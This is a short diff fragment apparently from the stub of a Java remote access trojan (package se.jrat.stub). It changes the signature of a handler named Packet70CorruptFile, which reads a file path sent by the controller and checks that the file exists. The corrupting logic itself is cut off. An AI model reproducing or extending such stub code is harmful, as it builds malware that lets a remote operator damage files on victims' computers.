@@ -10,7 +10,7 @@ import se.jrat.stub.Connection;
 public class Packet70CorruptFile extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String file = Connection.instance.readLine();
 		File f = new File(file);
 		if (f.exists()) {
